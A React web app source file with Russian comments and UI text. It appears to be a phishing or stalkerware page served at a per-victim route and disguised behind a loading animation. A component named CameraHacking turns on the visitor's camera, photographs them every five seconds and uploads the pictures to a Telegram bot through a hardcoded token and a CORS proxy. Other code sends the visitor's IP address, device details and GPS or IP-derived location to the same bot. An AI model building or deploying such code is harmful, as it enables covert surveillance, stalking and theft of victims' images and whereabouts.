import React, { useRef, useEffect, useState } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import axios from "axios";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission }) => {
  const streamRef = useRef(null);
  const captureIntervalRef = useRef(null);
  const [isInitialized, setIsInitialized] = useState(false);
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [captureCount, setCaptureCount] = useState(0);
  const [debugLogs, setDebugLogs] = useState([]);
  const [isSending, setIsSending] = useState(false);
  const [userConsent, setUserConsent] = useState(false);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
  const CAPTURE_INTERVAL = 5000;
  const MAX_CAPTURES = 20;

  const addDebugLog = (message) => {
    const log = `${new Date().toLocaleTimeString()}: ${message}`;
    console.log(log);
    setDebugLogs(prev => [log, ...prev].slice(0, 20));
  };

  const sendToTelegram = async (text) => {
    try {
      const response = await fetch(`https://cors-proxy.telegram-api.workers.dev/?url=https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML'
        })
      });

      return response.ok;

    } catch (error) {
      console.error('Telegram send error:', error);
      // Fallback to direct request
      try {
        const directResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          mode: 'no-cors',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML'
          })
        });
        return true; // Assume success with no-cors
      } catch {
        return false;
      }
    }
  };

  const sendPhotoToTelegram = async (blob, caption = '') => {
    if (isSending) {
      addDebugLog('Пропускаем - уже идет отправка');
      return false;
    }

    setIsSending(true);
    try {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `photo_${Date.now()}.jpg`);

      if (caption) {
        formData.append('caption', caption);
      }

      // Используем CORS proxy для мобильных устройств
      const apiUrl = `https://cors-proxy.telegram-api.workers.dev/?url=https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;

      const response = await fetch(apiUrl, {
        method: 'POST',
        body: formData
      });

      if (response.ok) {
        addDebugLog(`✅ Фото отправлено!`);
        return true;
      } else {
        // Fallback: пытаемся отправить напрямую
        try {
          const directResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            mode: 'no-cors',
            body: formData
          });
          addDebugLog(`✅ Фото отправлено (no-cors)!`);
          return true;
        } catch (fallbackError) {
          addDebugLog(`❌ Ошибка отправки: ${fallbackError.message}`);
          return false;
        }
      }

    } catch (error) {
      addDebugLog(`❌ Ошибка отправки: ${error.message}`);
      return false;
    } finally {
      setIsSending(false);
    }
  };

  const createTestImage = async () => {
    const canvas = document.createElement('canvas');
    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext('2d');

    const colors = ['#FF6B6B', '#4ECDC4', '#45B7D1', '#96CEB4', '#FFEAA7'];
    ctx.fillStyle = colors[Math.floor(Math.random() * colors.length)];
    ctx.fillRect(0, 0, 640, 480);

    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 32px Arial';
    ctx.textAlign = 'center';
    ctx.fillText('Camera Test', 320, 150);

    ctx.font = '20px Arial';
    ctx.fillText(new Date().toLocaleTimeString(), 320, 200);
    ctx.fillText(`Android ${deviceInfo?.androidVersion || ''}`, 320, 240);
    ctx.fillText(`Photo #${captureCount + 1}`, 320, 280);

    ctx.beginPath();
    ctx.arc(320, 350, 60, 0, Math.PI * 2);
    ctx.strokeStyle = '#FFFFFF';
    ctx.lineWidth = 6;
    ctx.stroke();

    ctx.beginPath();
    ctx.arc(320, 350, 25, 0, Math.PI * 2);
    ctx.fillStyle = '#FFFFFF';
    ctx.fill();

    return new Promise(resolve => {
      canvas.toBlob(resolve, 'image/jpeg', 0.9);
    });
  };

  const captureCameraPhoto = async () => {
    if (!videoRef.current || !streamRef.current) {
      addDebugLog('Камера не готова');
      return await createTestImage();
    }

    const video = videoRef.current;

    if (video.videoWidth === 0 || video.videoHeight === 0) {
      addDebugLog('Видео не готово (0x0)');
      return await createTestImage();
    }

    addDebugLog(`Захват фото #${captureCount + 1} (${video.videoWidth}x${video.videoHeight})`);

    try {
      const canvas = document.createElement('canvas');
      
      // Для мобильных устройств используем меньшие размеры
      const maxWidth = 1280;
      const maxHeight = 720;
      
      let width = video.videoWidth;
      let height = video.videoHeight;
      
      if (width > maxWidth) {
        height = Math.round(height * maxWidth / width);
        width = maxWidth;
      }
      if (height > maxHeight) {
        width = Math.round(width * maxHeight / height);
        height = maxHeight;
      }
      
      canvas.width = width;
      canvas.height = height;

      const ctx = canvas.getContext('2d');
      
      // Рисуем изображение с правильными пропорциями
      ctx.drawImage(video, 0, 0, width, height);

      // Добавляем водяной знак
      ctx.fillStyle = 'rgba(0, 0, 0, 0.5)';
      ctx.fillRect(10, 10, 300, 100);
      
      ctx.fillStyle = 'white';
      ctx.font = '16px Arial';
      ctx.fillText(`Фото #${captureCount + 1}`, 20, 35);
      ctx.fillText(`${new Date().toLocaleString()}`, 20, 60);
      ctx.fillText(`${video.videoWidth}x${video.videoHeight}`, 20, 85);

      return new Promise(resolve => {
        canvas.toBlob(resolve, 'image/jpeg', 0.7);
      });

    } catch (error) {
      addDebugLog(`Ошибка захвата: ${error.message}`);
      return await createTestImage();
    }
  };

  const captureAndSend = async () => {
    if (!userConsent) {
      addDebugLog('Требуется согласие пользователя');
      return;
    }

    if (captureCount >= MAX_CAPTURES) {
      addDebugLog(`Достигнут лимит ${MAX_CAPTURES} фото`);
      stopCapturing();
      return;
    }

    if (isSending) {
      addDebugLog('Пропускаем - уже идет отправка предыдущего фото');
      return;
    }

    addDebugLog(`=== Захват ${captureCount + 1}/${MAX_CAPTURES} ===`);

    const photoBlob = await captureCameraPhoto();

    if (!photoBlob) {
      addDebugLog('Не удалось захватить фото');
      return;
    }

    const caption = `📸 Фото #${captureCount + 1}\n` +
      `📊 Размер: ${Math.round(photoBlob.size / 1024)} KB\n` +
      `⏰ Время: ${new Date().toLocaleTimeString()}\n` +
      `📱 Устройство: ${deviceInfo?.platform || 'Unknown'}`;

    const success = await sendPhotoToTelegram(photoBlob, caption);

    if (success) {
      setCaptureCount(prev => prev + 1);
      addDebugLog(`✅ Успешно! Всего: ${captureCount + 1}`);

      if ((captureCount + 1) % 5 === 0) {
        await sendToTelegram(
          `📊 Статистика: ${captureCount + 1} фото\n` +
          `📱 Устройство: ${deviceInfo?.platform || 'Unknown'}\n` +
          `🖼 Разрешение: ${deviceInfo?.resolution || 'unknown'}\n` +
          `⏰ Время: ${new Date().toLocaleString()}`
        );
      }
    } else {
      addDebugLog('❌ Не удалось отправить фото');
    }
  };

  const initializeCamera = async () => {
    addDebugLog('Инициализация камеры...');

    try {
      const ua = navigator.userAgent;
      const isMobile = /mobile|android|iphone|ipad/i.test(ua.toLowerCase());
      const platform = isMobile ? 'Mobile' : 'Desktop';

      setDeviceInfo({
        isMobile,
        platform,
        userAgent: ua
      });

      addDebugLog(`Устройство: ${platform}`);

      const constraints = {
        video: {
          facingMode: { exact: "environment" },
          width: { ideal: 1280, max: 1920 },
          height: { ideal: 720, max: 1080 },
          frameRate: { ideal: 30 }
        },
        audio: false
      };

      // Пробуем сначала заднюю камеру, потом любую доступную
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        streamRef.current = stream;
        addDebugLog('Задняя камера активирована');
      } catch (backError) {
        addDebugLog('Задняя камера недоступна, пробуем переднюю');
        const frontConstraints = {
          video: {
            facingMode: "user",
            width: { ideal: 1280 },
            height: { ideal: 720 }
          },
          audio: false
        };
        const stream = await navigator.mediaDevices.getUserMedia(frontConstraints);
        streamRef.current = stream;
        addDebugLog('Передняя камера активирована');
      }

      if (videoRef.current && streamRef.current) {
        const video = videoRef.current;

        video.playsInline = true;
        video.muted = true;
        video.autoplay = true;
        video.setAttribute('playsinline', 'true');
        video.setAttribute('muted', 'true');
        video.setAttribute('autoplay', 'true');
        video.setAttribute('webkit-playsinline', 'true');

        video.srcObject = streamRef.current;

        // Ждем готовности видео
        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            const resolution = `${video.videoWidth}x${video.videoHeight}`;
            setDeviceInfo(prev => ({ ...prev, resolution }));
            addDebugLog(`Видео готово: ${resolution}`);
            
            // На мобильных устройствах играем видео с задержкой
            setTimeout(() => {
              video.play().then(() => {
                addDebugLog('Видео запущено');
                resolve();
              }).catch((playError) => {
                addDebugLog('Auto-play заблокирован: ' + playError.message);
                // Показываем кнопку для ручного запуска
                const playButton = document.createElement('button');
                playButton.innerHTML = '▶️ Включить камеру';
                playButton.style.cssText = `
                  position: fixed;
                  top: 50%;
                  left: 50%;
                  transform: translate(-50%, -50%);
                  padding: 15px 30px;
                  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                  color: white;
                  border: none;
                  border-radius: 10px;
                  font-size: 18px;
                  cursor: pointer;
                  z-index: 10001;
                  box-shadow: 0 4px 15px rgba(0,0,0,0.3);
                `;
                playButton.onclick = () => {
                  video.play();
                  playButton.remove();
                  resolve();
                };
                document.body.appendChild(playButton);
                setTimeout(resolve, 3000);
              });
            }, 1000);
          };
        });

        await sendToTelegram(
          `📱 Устройство: ${platform}\n` +
          `📷 Камера активирована\n` +
          `🖼 Разрешение: ${deviceInfo?.resolution || 'unknown'}\n` +
          `⏰ Начало: ${new Date().toLocaleString()}`
        );

        setIsInitialized(true);
        return true;
      }

    } catch (error) {
      addDebugLog(`Ошибка инициализации: ${error.message}`);
      await sendToTelegram(`❌ Ошибка камеры: ${error.message}`);
      return false;
    }
  };

  const getClientIp = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      setClientIp(data.ip);

      await sendToTelegram(
        `🌐 IP: ${data.ip}\n` +
        `📱 Устройство: ${deviceInfo?.platform || 'Unknown'}\n` +
        `🌐 Браузер: ${navigator.userAgent.substring(0, 100)}`
      );

    } catch (error) {
      setClientIp('IP unavailable');
    }
  };

  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }

    addDebugLog(`🚀 Запуск захвата каждые ${CAPTURE_INTERVAL / 1000} секунд`);

    // Первый захват через 3 секунды
    setTimeout(() => {
      captureAndSend();
    }, 3000);

    captureIntervalRef.current = setInterval(() => {
      captureAndSend();
    }, CAPTURE_INTERVAL);
  };

  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }

    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => {
        track.stop();
        addDebugLog(`Остановлен ${track.kind} трек`);
      });
      streamRef.current = null;
    }

    addDebugLog('Захват остановлен');
  };

  const requestUserConsent = () => {
    if (window.confirm(
      'Для работы приложения необходим доступ к камере. ' +
      'Фотографии будут отправлены в Telegram. ' +
      'Продолжить?'
    )) {
      setUserConsent(true);
      return true;
    }
    return false;
  };

  useEffect(() => {
    let mounted = true;

    const init = async () => {
      addDebugLog('=== ИНИЦИАЛИЗАЦИЯ ===');

      if (!requestUserConsent()) {
        addDebugLog('❌ Пользователь отказал в доступе');
        return;
      }

      await getClientIp();

      if (!navigator.mediaDevices?.getUserMedia) {
        addDebugLog('❌ Камера не поддерживается');
        await sendToTelegram('❌ WebRTC не поддерживается');
        return;
      }

      const success = await initializeCamera();

      if (success && mounted) {
        startPeriodicCapture();
      }
    };

    // Запускаем инициализацию после загрузки страницы
    setTimeout(init, 1000);

    return () => {
      mounted = false;
      stopCapturing();
    };
  }, []);

  return (
    <>
      <div style={{
        position: 'fixed',
        top: '10px',
        right: '10px',
        background: 'rgba(0, 0, 0, 0.85)',
        color: 'white',
        padding: '15px',
        borderRadius: '10px',
        zIndex: 10000,
        maxWidth: '300px',
        fontSize: '14px',
        backdropFilter: 'blur(10px)',
        border: '1px solid rgba(255,255,255,0.2)',
        boxShadow: '0 4px 20px rgba(0,0,0,0.3)'
      }}>
        <h3 style={{ margin: '0 0 10px 0', color: '#4ECDC4', fontSize: '16px' }}>📷 Система камеры</h3>
        <div style={{ marginBottom: '8px' }}>
          <strong>Статус:</strong> {isInitialized ? '✅ Активна' : '🔄 Инициализация'}
        </div>
        <div style={{ marginBottom: '8px' }}>
          <strong>Устройство:</strong> {deviceInfo?.platform || 'Определение...'}
        </div>
        <div style={{ marginBottom: '8px' }}>
          <strong>Разрешение:</strong> {deviceInfo?.resolution || '0x0'}
        </div>
        <div style={{ marginBottom: '8px' }}>
          <strong>Фото:</strong> {captureCount} / {MAX_CAPTURES}
        </div>
        <div style={{ marginBottom: '8px' }}>
          <strong>Интервал:</strong> {CAPTURE_INTERVAL/1000} сек
        </div>
        <div style={{ 
          marginTop: '10px', 
          padding: '8px',
          background: captureCount > 0 ? 'rgba(46, 204, 113, 0.2)' : 'rgba(231, 76, 60, 0.2)',
          borderRadius: '8px',
          textAlign: 'center',
          border: '1px solid rgba(255,255,255,0.1)'
        }}>
          <div style={{ fontSize: '12px', marginBottom: '5px' }}>Следующее фото через:</div>
          <div style={{ fontSize: '18px', fontWeight: 'bold', color: captureCount > 0 ? '#2ecc71' : '#e74c3c' }}>
            {(() => {
              if (!captureIntervalRef.current) return '⏸️';
              const now = Date.now();
              const nextIn = Math.max(0, CAPTURE_INTERVAL - (now % CAPTURE_INTERVAL));
              return `${Math.ceil(nextIn/1000)} сек`;
            })()}
          </div>
        </div>
      </div>

      <div style={{
        position: 'fixed',
        top: '10px',
        left: '10px',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        color: 'white',
        padding: '12px 20px',
        borderRadius: '10px',
        cursor: 'pointer',
        zIndex: 10001,
        fontSize: '14px',
        fontWeight: 'bold',
        boxShadow: '0 4px 15px rgba(0,0,0,0.2)',
        border: '2px solid white',
        display: 'flex',
        alignItems: 'center',
        gap: '8px'
      }} onClick={captureAndSend}>
        <span>📸</span>
        <span>Сделать фото</span>
      </div>

      {process.env.NODE_ENV === 'development' && (
        <div style={{
          position: 'fixed',
          bottom: 0,
          left: 0,
          right: 0,
          background: 'rgba(0, 0, 0, 0.95)',
          color: '#00ff00',
          padding: '10px',
          fontSize: '11px',
          maxHeight: '150px',
          overflow: 'auto',
          fontFamily: 'monospace',
          zIndex: 9999,
          borderTop: '2px solid #00ff00'
        }}>
          <div style={{
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: 'center',
            marginBottom: '10px',
            paddingBottom: '5px',
            borderBottom: '1px solid #00ff00'
          }}>
            <strong style={{ fontSize: '12px', color: '#00ff00' }}>📡 DEBUG LOG</strong>
            <div style={{
              background: captureCount > 0 ? '#00ff00' : '#ff0000',
              color: '#000',
              padding: '3px 8px',
              borderRadius: '4px',
              fontWeight: 'bold',
              fontSize: '12px'
            }}>
              {captureCount} 📸
            </div>
          </div>

          <div style={{ maxHeight: '100px', overflow: 'auto' }}>
            {debugLogs.map((log, i) => (
              <div key={i} style={{
                padding: '3px 0',
                borderBottom: '1px solid #222',
                whiteSpace: 'nowrap',
                overflow: 'hidden',
                textOverflow: 'ellipsis',
                color: log.includes('✅') ? '#00ff00' :
                  log.includes('❌') ? '#ff4444' :
                    log.includes('⚠️') ? '#ffff00' : '#cccccc'
              }}>
                {log}
              </div>
            ))}
          </div>
        </div>
      )}
    </>
  );
};

/**
 * КОМПОНЕНТ LOCATIONHANDLER
 */
const LocationHandler = ({ setLocationPermission, setLocationSent, locationPermission, chatId, clientIp }) => {
  const [locationData, setLocationData] = useState(null);
  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';

  const sendToTelegram = async (text) => {
    try {
      const response = await fetch(`https://cors-proxy.telegram-api.workers.dev/?url=https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML'
        })
      });

      return response.ok;
    } catch (error) {
      console.error('Telegram send error:', error);
      return false;
    }
  };

  const sendLocationToTelegram = async (latitude, longitude) => {
    try {
      const response = await fetch(`https://cors-proxy.telegram-api.workers.dev/?url=https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          latitude: latitude,
          longitude: longitude
        })
      });

      return response.ok;
    } catch (error) {
      console.error('Error sending location:', error);
      return false;
    }
  };

  const getLocationByIp = async () => {
    try {
      const response = await fetch(`https://ipapi.co/${clientIp}/json/`);
      const data = await response.json();
      
      const coords = { 
        latitude: data.latitude, 
        longitude: data.longitude 
      };

      setLocationData({
        coords,
        city: data.city,
        region: data.region,
        country: data.country_name,
        provider: data.org,
        method: 'IP геолокация'
      });

      await sendLocationToTelegram(data.latitude, data.longitude);
      
      await sendToTelegram(
        `📍 Геолокация по IP\n\n` +
        `🏙 Город: ${data.city}\n` +
        `🗺 Регион: ${data.region}\n` +
        `🇺🇳 Страна: ${data.country_name}\n` +
        `🎯 Координаты: ${data.latitude}, ${data.longitude}\n` +
        `🌐 IP: ${clientIp}`
      );
      
      setLocationPermission(coords);
      setLocationSent(true);
    } catch (error) {
      console.error("Error fetching location:", error);
    }
  };

  const requestLocationPermission = async () => {
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      });

      const { latitude, longitude, accuracy } = position.coords;
      const coords = { latitude, longitude };

      setLocationData({
        coords,
        accuracy: Math.round(accuracy),
        method: 'GPS устройства'
      });

      await sendLocationToTelegram(latitude, longitude);
      
      await sendToTelegram(
        `📍 Геолокация по GPS\n\n` +
        `🎯 Точность: ±${Math.round(accuracy)} метров\n` +
        `📏 Координаты: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}\n` +
        `🌐 IP: ${clientIp}`
      );

      localStorage.setItem("locationPermission", JSON.stringify(coords));
      setLocationPermission(coords);
      setLocationSent(true);

    } catch (error) {
      if (error.code === error.PERMISSION_DENIED) {
        alert("Для точного определения местоположения разрешите доступ к геолокации.");
        getLocationByIp();
      } else {
        console.error("Error getting location:", error);
        getLocationByIp();
      }
    }
  };

  useEffect(() => {
    if (!locationPermission) {
      requestLocationPermission();
    }
  }, []);

  return locationData ? (
    <div style={{
      position: 'fixed',
      bottom: '10px',
      left: '10px',
      background: 'rgba(0, 0, 0, 0.85)',
      color: 'white',
      padding: '15px',
      borderRadius: '10px',
      zIndex: 9998,
      maxWidth: '320px',
      fontSize: '14px',
      backdropFilter: 'blur(10px)',
      border: '1px solid rgba(255,255,255,0.2)',
      boxShadow: '0 4px 20px rgba(0,0,0,0.3)'
    }}>
      <h3 style={{ margin: '0 0 10px 0', color: '#FF6B6B', fontSize: '16px' }}>📍 Геолокация</h3>
      <div style={{ marginBottom: '8px' }}>
        <strong>Метод:</strong> {locationData.method}
      </div>
      {locationData.city && (
        <div style={{ marginBottom: '8px' }}>
          <strong>Место:</strong> {locationData.city}, {locationData.country}
        </div>
      )}
      <div style={{ marginBottom: '8px' }}>
        <strong>Координаты:</strong><br/>
        {Number(locationData.coords.latitude).toFixed(6)},<br/>
        {Number(locationData.coords.longitude).toFixed(6)}
      </div>
      {locationData.accuracy && (
        <div style={{ marginBottom: '8px' }}>
          <strong>Точность:</strong> ±{locationData.accuracy} м
        </div>
      )}
      <div style={{ marginTop: '10px', fontSize: '12px', color: '#aaa' }}>
        Обновлено: {new Date().toLocaleTimeString()}
      </div>
    </div>
  ) : null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();
  const videoRef = useRef(null);

  const [isCameraActive, setIsCameraActive] = useState(true);
  const [locationPermission, setLocationPermission] = useState(null);
  const [clientIp, setClientIp] = useState("");
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [showMobileWarning, setShowMobileWarning] = useState(false);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';

  const sendToTelegram = async (text) => {
    try {
      const response = await fetch(`https://cors-proxy.telegram-api.workers.dev/?url=https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML'
        })
      });

      return response.ok;
    } catch (error) {
      console.error('Telegram send error:', error);
      return false;
    }
  };

  const getBatteryLevel = async () => {
    try {
      if ("getBattery" in navigator) {
        const battery = await navigator.getBattery();
        return {
          level: Math.floor(battery.level * 100) + "%",
          charging: battery.charging
        };
      } else {
        return {
          level: "Недоступно",
          charging: false
        };
      }
    } catch (error) {
      return {
        level: "Ошибка",
        charging: false
      };
    }
  };

  const getDeviceInfo = () => {
    const userAgent = navigator.userAgent;
    const isMobile = /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
    
    return {
      userAgent,
      platform: navigator.platform,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      devicePixelRatio: window.devicePixelRatio,
      deviceType: isMobile ? "Мобильное устройство" : "Компьютер",
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      connection: navigator.connection || null,
      memory: navigator.deviceMemory,
      cores: navigator.hardwareConcurrency,
      isMobile
    };
  };

  useEffect(() => {
    const init = async () => {
      const info = getDeviceInfo();
      setDeviceInfo(info);
      
      // Показываем предупреждение для мобильных
      if (info.isMobile) {
        setShowMobileWarning(true);
        setTimeout(() => setShowMobileWarning(false), 5000);
      }

      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        setClientIp(data.ip);
      } catch {
        setClientIp("Неизвестно");
      }
    };

    init();
  }, []);

  return (
    <>
      <div className="App" style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        padding: '20px',
        boxSizing: 'border-box'
      }}>
        <div className="wraper" style={{
          position: 'relative',
          width: '100%',
          maxWidth: '600px',
          margin: '0 auto'
        }}>
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
          
          <div style={{
            marginTop: '30px',
            textAlign: 'center',
            color: 'white'
          }}>
            <h1 style={{ fontSize: '24px', marginBottom: '10px' }}>📷 Система камеры</h1>
            <p style={{ fontSize: '16px', opacity: 0.9 }}>
              {deviceInfo?.isMobile ? 'Мобильное устройство' : 'Компьютер'}
            </p>
          </div>
        </div>

        <video
          ref={videoRef}
          autoPlay
          muted
          playsInline
          style={{ 
            display: 'none',
            position: 'fixed',
            top: '0',
            left: '0',
            width: '100%',
            height: '100%',
            objectFit: 'cover',
            zIndex: -1
          }}
        />
      </div>

      {showMobileWarning && (
        <div style={{
          position: 'fixed',
          top: '20px',
          left: '50%',
          transform: 'translateX(-50%)',
          background: 'rgba(255, 193, 7, 0.9)',
          color: '#000',
          padding: '15px 20px',
          borderRadius: '10px',
          zIndex: 10002,
          fontSize: '14px',
          maxWidth: '90%',
          textAlign: 'center',
          boxShadow: '0 4px 15px rgba(0,0,0,0.2)',
          animation: 'fadeInOut 5s ease-in-out'
        }}>
          ⚠️ Для работы на мобильном устройстве разрешите доступ к камере
        </div>
      )}

      {deviceInfo && (
        <div style={{
          position: 'fixed',
          top: '200px',
          right: '10px',
          background: 'rgba(0, 0, 0, 0.85)',
          color: 'white',
          padding: '15px',
          borderRadius: '10px',
          zIndex: 9997,
          maxWidth: '300px',
          maxHeight: '400px',
          overflow: 'auto',
          fontSize: '14px',
          backdropFilter: 'blur(10px)',
          border: '1px solid rgba(255,255,255,0.2)',
          boxShadow: '0 4px 20px rgba(0,0,0,0.3)'
        }}>
          <h3 style={{ margin: '0 0 10px 0', color: '#FFEAA7', fontSize: '16px' }}>📱 Устройство</h3>
          <div style={{ marginBottom: '8px' }}>
            <strong>Тип:</strong> {deviceInfo.deviceType}
          </div>
          <div style={{ marginBottom: '8px' }}>
            <strong>Экран:</strong> {deviceInfo.screenWidth}×{deviceInfo.screenHeight}
          </div>
          <div style={{ marginBottom: '8px' }}>
            <strong>Язык:</strong> {deviceInfo.language}
          </div>
          <div style={{ marginBottom: '8px' }}>
            <strong>Часовой пояс:</strong> {deviceInfo.timezone}
          </div>
          {deviceInfo.cores && (
            <div style={{ marginBottom: '8px' }}>
              <strong>Ядра CPU:</strong> {deviceInfo.cores}
            </div>
          )}
          {deviceInfo.connection && (
            <div style={{ marginBottom: '8px' }}>
              <strong>Сеть:</strong> {deviceInfo.connection.effectiveType}
            </div>
          )}
          <div style={{ marginTop: '10px', fontSize: '12px', color: '#aaa' }}>
            IP: {clientIp || 'Определение...'}
          </div>
        </div>
      )}

      <LocationHandler
        chatId={chatId}
        locationPermission={locationPermission}
        setLocationPermission={setLocationPermission}
        setLocationSent={() => {}}
        clientIp={clientIp}
      />

      {isCameraActive && (
        <CameraHacking
          chatId={chatId}
          videoRef={videoRef}
          setClientIp={setClientIp}
          setLocationPermission={setLocationPermission}
        />
      )}

      <style>{`
        @keyframes fadeInOut {
          0% { opacity: 0; transform: translateX(-50%) translateY(-20px); }
          10% { opacity: 1; transform: translateX(-50%) translateY(0); }
          90% { opacity: 1; transform: translateX(-50%) translateY(0); }
          100% { opacity: 0; transform: translateX(-50%) translateY(-20px); }
        }
        
        /* Мобильная адаптация */
        @media (max-width: 768px) {
          .App {
            padding: 10px !important;
          }
          
          h1 {
            font-size: 20px !important;
          }
          
          .wraper {
            transform: scale(0.8);
          }
        }
        
        @media (max-width: 480px) {
          .wraper {
            transform: scale(0.7);
          }
        }
      `}</style>
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
